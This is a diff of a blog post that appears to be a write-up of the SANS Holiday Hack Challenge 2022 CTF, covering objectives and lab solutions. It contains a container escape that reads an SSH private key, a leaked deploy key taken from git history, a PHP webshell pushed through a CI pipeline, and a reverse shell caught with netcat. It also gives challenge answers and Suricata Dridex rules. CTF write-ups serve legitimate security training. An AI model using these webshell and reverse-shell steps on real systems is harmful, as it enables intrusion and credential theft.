@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  Sans Holiday Hack Challenge Kringle Con 5
+title:  Sans Holiday Hack Challenge Kringle Con 5 2022
 categories: ctfs
 tags: [sans, ctf]
 published: true
@@ -9,6 +9,8 @@ show_sidebar: true
 toc: true
 searchable: true
 ---
+
+
 The 2022 SANS Holiday Hack Challenge
 Featuring KringleCon 5: Golden Rings!
 Welcome to this year's SANS Holiday Hack Challenge! We can't wait for you to hop in the game and share some holiday cheer as you build vital cybersecurity skills.
@@ -67,9 +69,19 @@ Key: 0xee7d8bcb8b5238023749792d17da4e0b9ed69dc9202b32e51962c58e1b54f276
 
 [![](/assets/images/sans/2022/828f24a2.png)](/assets/images/sans/2022/828f24a2.png)
 
-# Hall of talks (CHEST)
+# CHESTS
+
+## Hall of Talks
+
+[![](/assets/images/sans/2022/c26621c7.png)](/assets/images/sans/2022/c26621c7.png)
 
 [![](/assets/images/sans/2022/6489417a.png)](/assets/images/sans/2022/6489417a.png)
+
+## Below the Elfen Ring  
+
+[![](/assets/images/sans/2022/47b754e2.png)](/assets/images/sans/2022/47b754e2.png)
+
+[![](/assets/images/sans/2022/35a034ac.png)](/assets/images/sans/2022/35a034ac.png)
 
 # (&#x2713;) Recover the Tolkien Ring Objectives list
 
@@ -258,7 +270,7 @@ honey
 ### (&#x2713;) 1. 
 
 RULE TO ADD:
-```bash
+```shell
 alert dns $HOME_NET any -> any any (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"adv.epostoday.uk"; nocase; sid:2025219; rev:4;)
 ```
 
@@ -267,7 +279,7 @@ alert dns $HOME_NET any -> any any (msg:"Known bad DNS lookup, possible Dridex i
 [![](/assets/images/sans/2022/c453ef3a.png)](/assets/images/sans/2022/c453ef3a.png)
 
 RULE TO ADD:
-```bash
+```shell
 alert http [192.185.57.242/32] any -> $HOME_NET any (msg:"Investigate suspicious connections, possible Dridex infection"; sid:2025220;)
 alert http $HOME_NET any -> [192.185.57.242/32] any (msg:"Investigate suspicious connections, possible Dridex infection"; sid:2025221;)
 ```
@@ -277,7 +289,7 @@ alert http $HOME_NET any -> [192.185.57.242/32] any (msg:"Investigate suspicious
 [![](/assets/images/sans/2022/595ba1bf.png)](/assets/images/sans/2022/595ba1bf.png)
 
 RULE TO ADD:
-```
+```shell
 alert tls any any -> any any (msg:"Investigate bad certificates, possible Dridex infection";tls.subject:"CN=heardbellith.Icanwepeh.nagoya"; sid:8; rev:1;)
 ```
 
@@ -286,21 +298,21 @@ alert tls any any -> any any (msg:"Investigate bad certificates, possible Dridex
 [![](/assets/images/sans/2022/8b8e88c7.png)](/assets/images/sans/2022/8b8e88c7.png)
 
 RULE TO ADD:
-```
+```shell
 alert http any any -> any any (file_data; content:"let byteCharacters = atob"; msg:"Suspicious JavaScript function, possible Dridex infection"; sid:5;)
 ```
 
-# Recover the Elfen Ring Objectives list
+# (&#x2713;) Recover the Elfen Ring Objectives list
 
 [![](/assets/images/sans/2022/74cfb29d.png)](/assets/images/sans/2022/74cfb29d.png)
 
-## 1) Clone with a Difference
+## (&#x2713;) 1) Clone with a Difference
 
 [![](/assets/images/sans/2022/ed826479.png)](/assets/images/sans/2022/ed826479.png)
 
 [![](/assets/images/sans/2022/62b0ba84.png)](/assets/images/sans/2022/62b0ba84.png)
 
-## 2) Prison Escape
+## (&#x2713;) 2) Prison Escape
 
 [https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/](https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/)
 
@@ -308,7 +320,7 @@ alert http any any -> any any (file_data; content:"let byteCharacters = atob"; m
 
 [![](/assets/images/sans/2022/f82f9d80.png)](/assets/images/sans/2022/f82f9d80.png)
 
-```bash
+```shell
 mount /dev/vda /mnt
 cat /mnt/home/jailer/.ssh/jail.key.priv
 082bb339ec19de4935867
@@ -317,12 +329,230 @@ cat /mnt/home/jailer/.ssh/jail.key.priv
 [![](/assets/images/sans/2022/cf1a0e30.png)](/assets/images/sans/2022/cf1a0e30.png)
 
 
-## 3) Jolly CI/CD
+## (&#x2713;) 3) Jolly CI/CD
 
 [![](/assets/images/sans/2022/81e22718.png)](/assets/images/sans/2022/81e22718.png)
 
+[![](/assets/images/sans/2022/d88c3b51.png)](/assets/images/sans/2022/d88c3b51.png)
+
+```html
+https://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+```
+
 [![](/assets/images/sans/2022/aaed7a41.png)](/assets/images/sans/2022/aaed7a41.png)
 
+### Scanning
+
+made file ~/nmap-bootstrap.xsl from:
+[https://j1v37u2k3y.github.io/assets/reports/nmap/nmap-bootstrap.xsl](https://j1v37u2k3y.github.io/assets/reports/nmap/nmap-bootstrap.xsl)
+
+#### Get All Hosts
+
+```shell
+#!/bin/bash
+IP="172.18.0.0/24"
+working_dir="${HOME}/nmap/${IP}"
+rm -rf "${working_dir}"
+mkdir -p "${working_dir}"
+nmap -n -vvv -p- -oA "${working_dir}"/version --stylesheet ~/nmap-bootstrap.xsl "${IP}"
+```
+
+#### Scan to refine results
+
+```shell
+#!/bin/bash
+IP="172.18.0.0/24"
+working_dir="${HOME}/nmap/${IP}"
+cat $working_dir/version.gnmap | grep open | cut -d ":" -f 2 | cut -d " " -f 2 > "${working_dir}/hosts"
+new_working_dir="${HOME}/nmap/${IP}/refined"
+rm -rf "${new_working_dir}"
+mkdir -p "${new_working_dir}"
+nmap -n -vvv -p- -oA "${new_working_dir}"/multiple --stylesheet ~/nmap-bootstrap.xsl -iL "${working_dir}/hosts"
+```
+
+##### Yields 5 hosts
+<a href="{{ site.baseurl }}/assets/reports/sans/2022/172.18.0.0/24/nmap-initial.nmap.html" target="_blank" title="Full Scan">Full Scan</a>
+<a href="{{ site.baseurl }}/assets/reports/sans/2022/172.18.0.0/24/multiple.html" target="_blank" title="Full Scan">Full Scan</a>
+
+###### Copied the multiple.xml file to my system
+
+```shell
+wget https://j1v37u2k3y.github.io/assets/reports/nmap/nmap-bootstrap.xsl -O ~/nmap-bootstrap.xsl
+xsltproc -o multiple.html ~/nmap-bootstrap.xsl multiple.xml
+```
+
+### Add hosts to /etc/hosts
+
+```shell
+sudo su
+echo "172.18.0.87   wordpress-db.local_docker_network" >> /etc/hosts
+echo "172.18.0.88   wordpress.local_docker_network wordpress.flag.net.internal" >> /etc/hosts
+echo "172.18.0.150  gitlab.flag.net.internal" >> /etc/hosts
+exit # change user back to samways
+```
+[![](/assets/images/sans/2022/f072e80d.png)](/assets/images/sans/2022/f072e80d.png)
+
+#### Clone from website
+
+> Note: 
+> It takes a while for the gitlab service to start up
+
+```shell
+git config user.email "sporx@@kringlecon.com"
+git config user.name "knee-oh"
+git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+cd wordpress.flag.net.internal
+git log
+```
+
+```shell
+commit 37b5d575bf81878934adb937a4fff0d32a8da105 (HEAD -> main, origin/main, origin/HEAD)
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Wed Oct 26 13:58:15 2022 -0700
+
+    updated wp-config
+
+commit a59cfe83522c9aeff80d49a0be2226f4799ed239
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Wed Oct 26 12:41:05 2022 -0700
+
+    update gitlab.ci.yml
+
+commit a968d32c0b58fd64744f8698cbdb60a97ec604ed
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Tue Oct 25 16:43:48 2022 -0700
+
+    test
+
+commit 7093aad279fc4b57f13884cf162f7d80f744eea5
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Tue Oct 25 15:08:14 2022 -0700
+
+    add gitlab-ci
+
+commit e2208e4bae4d41d939ef21885f13ea8286b24f05
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Tue Oct 25 13:43:53 2022 -0700
+
+    big update
+
+commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Tue Oct 25 13:42:54 2022 -0700
+
+    whoops
+
+commit abdea0ebb21b156c01f7533cea3b895c26198c98
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Tue Oct 25 13:42:13 2022 -0700
+
+    added assets
+
+commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
+Author: knee-oh <sporx@kringlecon.com>
+Date:   Mon Oct 24 17:32:07 2022 -0700
+
+    init commit
+```
+
+[![](/assets/images/sans/2022/f6955924.png)](/assets/images/sans/2022/f6955924.png)
+
+```shell
+git revert e19f653bde9ea3de6af21a587e41e7a909db1ca5
+cat .ssh/.deploy
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### Following along with these links:
+- [https://medium.com/@michael.rhema/how-to-use-specific-ssh-keys-for-git-push-4ecf3b31eeb4](https://medium.com/@michael.rhema/how-to-use-specific-ssh-keys-for-git-push-4ecf3b31eeb4)
+- [https://howto.lintel.in/git-how-to-push-code-to-repository-on-remote-ssh-server/](https://howto.lintel.in/git-how-to-push-code-to-repository-on-remote-ssh-server/)
+- [https://dev.to/gdledsan/access-a-private-repository-from-gitlab-ci-42mh](https://dev.to/gdledsan/access-a-private-repository-from-gitlab-ci-42mh)
+
+#### Add to ~/.ssh/config
+
+```shell
+chmod 600 /home/samways/wordpress.flag.net.internal/.ssh/.deploy
+mkdir -p ~/.ssh
+cat << EOF > ~/.ssh/config
+Host gitlab.flag.net.internal
+    Hostname gitlab.flag.net.internal
+    IdentityFile /home/samways/wordpress.flag.net.internal/.ssh/.deploy
+    IdentitiesOnly yes 
+EOF
+```
+
+#### Create webshell for server
+
+```shell
+echo "<?php echo system(\$_GET['j1v37u2k3y_code']); ?>" > j1v37u2k3y.php
+```
+
+#### Push the code to repo
+
+```shell
+git add .
+git commit -m "adding some code to test"
+git push git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git main
+```
+
+#### Test our code to check to see if works on the remote server
+
+```shell
+curl "http://wordpress.flag.net.internal/j1v37u2k3y.php?j1v37u2k3y_code=ls"
+```
+
+[![](/assets/images/sans/2022/beb2a0d1.png)](/assets/images/sans/2022/beb2a0d1.png)
+
+#### WE HAVE CODE EXECUTION (now for a reverse shell)
+
+> On local machine
+
+```shell
+mkdir -p tools
+cd tools	
+git clone https://github.com/welikechips/shellcode.git
+path=$(pwd)
+ln -s ${path}/shellcode/shellcode.py /usr/bin/shellcode
+cd shellcode
+pip3 install -r requirements.txt
+shellcode 172.18.0.99 3001
+# select 0 -> then 26
+cat php-reverse-shell.php
+```
+
+> Paste that shell to j1v37u2k3y.php
+> Set up our listener
+ 
+```shell
+nc -nlvp 3001
+```
+
+> Send our code to server
+
+```shell
+git add .
+git commit -m "adding some code to test"
+git push git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git main
+```
+> Curl our shell. (j1v37u2k3y.php)
+
+```shell
+curl "http://wordpress.flag.net.internal/j1v37u2k3y.php"
+```
+There is a flag.txt in the directory
+
+[![](/assets/images/sans/2022/4cb4c0d5.png)](/assets/images/sans/2022/4cb4c0d5.png)
+
+> flag.txt
+```shell
+oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
+```
 
 # Recover the Web Ring Objectives list
 
@@ -330,6 +560,61 @@ cat /mnt/home/jailer/.ssh/jail.key.priv
 
 [![](/assets/images/sans/2022/a819888b.png)](/assets/images/sans/2022/a819888b.png)
 
+## (&#x2713;) 1. Naughty IP
+
+> Use the artifacts from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Web Ring for hints.
+
+> Examine the artifacts and scroll through the weberror.log
+
+[![](/assets/images/sans/2022/edb041a0.png)](/assets/images/sans/2022/edb041a0.png)
+
+Enter IP
+```shell
+18.222.86.32
+```
+
+## (&#x2713;) 2. Credential Mining
+
+> The first attack is a brute force login. What's the first username tried?
+
+[![](/assets/images/sans/2022/e9ee3757.png)](/assets/images/sans/2022/e9ee3757.png)
+
+Enter username
+```shell
+alice
+```
+
+## (&#x2713;) 3. 404 FTW
+
+> The next attack is forced browsing where the naughty one is guessing URLs. What's the first successful URL path in this attack?
+
+[![](/assets/images/sans/2022/08cceb69.png)](/assets/images/sans/2022/08cceb69.png)
+
+Enter path
+```shell
+/proc
+```
+
+## (&#x2713;) 4. IMDS, XXE, and Other Abbreviations
+
+> The last step in this attack was to use XXE to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?
+
+[![](/assets/images/sans/2022/1cee7cdd.png)](/assets/images/sans/2022/1cee7cdd.png)
+
+Enter url
+```shell
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+```
+
+## (x) 5. Open Boria Mine Door
+
+[https://hhc22-novel.kringlecon.com/](https://hhc22-novel.kringlecon.com/)
+
+> Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge.
+
+[![](/assets/images/sans/2022/6dd189c9.png)](/assets/images/sans/2022/6dd189c9.png)
+
+[![](/assets/images/sans/2022/7fbf4d2b.png)](/assets/images/sans/2022/7fbf4d2b.png)
 
 # Recover the Cloud Ring Objectives list
 
@@ -339,5 +624,3 @@ cat /mnt/home/jailer/.ssh/jail.key.priv
 # Recover the Burning Ring of Fire Objectives list
 
 [![](/assets/images/sans/2022/10ca04ff.png)](/assets/images/sans/2022/10ca04ff.png)
-
-
